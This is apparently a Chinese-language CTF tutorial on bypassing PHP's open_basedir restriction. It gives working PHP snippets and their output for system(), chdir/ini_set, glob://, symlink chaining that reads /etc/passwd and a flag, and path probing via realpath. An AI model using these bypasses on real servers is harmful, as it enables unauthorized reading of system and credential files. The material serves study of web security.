## open_basedir绕过

>`open_basedir`将php所能打开的文件限制在指定的目录中,当程序使用如`file_get_contents()`函数来读取文件时,会检查文件位置,如果不在指定的目录下,会拒绝打开

`php.ini`中设置`open_basedir=/var/www/html`

```php
<?php
var_dump(scandir('.'));
echo '<br><br>';
var_dump(scandir('/'));
?>
```

```
array(9) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(13) "bjd_ezphp.php" [3]=> string(7) "dropbox" [4]=> string(8) "flag.php" [5]=> string(12) "fuzz_rce.php" [6]=> string(12) "geek_rce.php" [7]=> string(8) "phar.php" [8]=> string(8) "test.php" }


Warning: scandir(): open_basedir restriction in effect. File(/) is not within the allowed path(s): (/var/www/html) in /var/www/html/test.php on line 4

Warning: scandir(/): failed to open dir: Operation not permitted in /var/www/html/test.php on line 4

Warning: scandir(): (errno 1): Operation not permitted in /var/www/html/test.php on line 4
bool(false) 
```

### 利用system函数绕过

> 相当于直接执行系统命令,不受open_basedir影响

```php
<?php
var_dump(scandir('/'));
echo '<br><br>';
system("cd / && ls");
?>
```

```
Warning: scandir(): open_basedir restriction in effect. File(/) is not within the allowed path(s): (/var/www/html) in /var/www/html/test.php on line 2

Warning: scandir(/): failed to open dir: Operation not permitted in /var/www/html/test.php on line 2

Warning: scandir(): (errno 1): Operation not permitted in /var/www/html/test.php on line 2
bool(false)

bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var 
```

## 利用chdir和ini_set绕过

[原理](https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#poc%E6%B5%8B%E8%AF%95)

```php
<?php
mkdir('test');
chdir('test');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
var_dump(scandir('/'));
?>
```

```
array(22) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(4) "home" [8]=> string(3) "lib" [9]=> string(5) "lib64" [10]=> string(5) "media" [11]=> string(3) "mnt" [12]=> string(3) "opt" [13]=> string(4) "proc" [14]=> string(4) "root" [15]=> string(3) "run" [16]=> string(4) "sbin" [17]=> string(3) "srv" [18]=> string(3) "sys" [19]=> string(3) "tmp" [20]=> string(3) "usr" [21]=> string(3) "var" } 
```

### 利用glob://

```php
<?php
var_dump(scandir('glob:///*'));
?>
```

```
array(19) { [0]=> string(3) "bin" [1]=> string(4) "boot" [2]=> string(3) "dev" [3]=> string(3) "etc" [4]=> string(4) "home" [5]=> string(3) "lib" [6]=> string(5) "lib64" [7]=> string(5) "media" [8]=> string(3) "mnt" [9]=> string(3) "opt" [10]=> string(4) "proc" [11]=> string(4) "root" [12]=> string(3) "run" [13]=> string(4) "sbin" [14]=> string(3) "srv" [15]=> string(3) "sys" [16]=> string(3) "tmp" [17]=> string(3) "usr" [18]=> string(3) "var" } 
```

只能对根目录进行读取,当传入的参数为`glob://*`时会列出open_basedir允许目录下的文件

### 利用symlink

```php
<?php
@mkdir('a/b/c/d/e/f/g/');
symlink('a/b/c/d/e/f/g','temp');
ini_set('open_basedir','/var/www/html:readfile/');
symlink('temp/../../../../../../','readfile');
unlink('temp');
symlink('/var/www/html','temp');
var_dump(file_get_contents('readfile/flag'));
echo '<br><br>';
var_dump(file_get_contents('readfile/etc/passwd'));
unlink('temp');
unlink('readfile');
?>
```

```
string(11) "flag{flag} "

string(926) "root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin "
```

1. 在`/var/www/html`目录下新建`a/b/c/d/e/f/g/`目录
2. 在`/var/www/html`目录下创建链接`temp`到`a/b/c/d/e/f/g`
3. `symlink('temp/../../../../../../','readfile');`等价于`symlink('a/b/c/d/e/f/g/../../../../../../','readfile');`
4. `ini_set('open_basedir','/var/www/html:readfile/');`添加权限
5. `unlink('temp');`然后`symlink('/var/www/html','temp');`等价于`symlink('/var/www/html/../../../../../../','readfile');`相当于`readfile`为根目录

## SplFileInfo::getRealPath或者realpath

用于验证该路径是否存在,没有考虑`open_basedir`

```php
<?php
$info = new SplFileInfo('/flag');
var_dump($info->getRealPath());
$info = new SplFileInfo('/etc/passwd');
var_dump($info->getRealPath());
$info = new SplFileInfo('/etc/wdnmd');
var_dump($info->getRealPath());
?>
```

```
string(5) "/flag"
string(11) "/etc/passwd"
bool(false)
```

用样也可以用`realpath`

```php
<?php
var_dump(realpath('/asdf'));
var_dump(realpath('/flag'));
?>
```

> 注意报错,用报错来判断文件是否存在

```
bool(false)

Warning: realpath(): open_basedir restriction in effect. File(/flag) is not within the allowed path(s): (/var/www/html) in /var/www/html/test.php on line 3
bool(false)
```